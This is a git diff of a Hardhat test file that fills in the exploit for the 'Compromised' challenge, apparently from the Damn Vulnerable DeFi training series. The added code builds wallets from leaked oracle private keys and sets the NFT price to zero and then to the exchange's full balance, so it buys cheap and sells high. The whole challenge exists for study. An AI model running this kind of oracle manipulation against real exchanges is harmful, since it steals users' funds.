@@ -1,5 +1,6 @@
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
+const decodeResponse = require("./decode_response.js");
 
 describe('Compromised challenge', function () {
 
@@ -59,8 +60,32 @@ describe('Compromised challenge', function () {
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {
+        // by examining the output of decodeResponse(), it looks like we've got some private keys :)
+        const wallets = decodeResponse().map(el => new ethers.Wallet(el, ethers.provider));
+        
+        // ...and so it happens the related addresses are two of the oracles'
+        console.log(await wallets[0].getAddress(), sources[1]);
+        console.log(await wallets[1].getAddress(), sources[2]);
+        
+        // by manipulating oracle's prices, we can now do whatever we want
+        for (wallet of wallets) {
+          await this.oracle.connect(wallet).postPrice("DVNFT", 0);
+        }
+        
+        const tx = await (await this.exchange.connect(attacker).buyOne({ value: 1 })).wait();
+        const tokenId = tx.events.find(el => el.event === "TokenBought").args.tokenId;
+        
+        for (wallet of wallets) {
+          await this.oracle.connect(wallet).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        }
+        
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+        await this.exchange.connect(attacker).sellOne(tokenId);
+        
+        for (wallet of wallets) {
+          await this.oracle.connect(wallet).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        }
     });
 
     after(async function () {
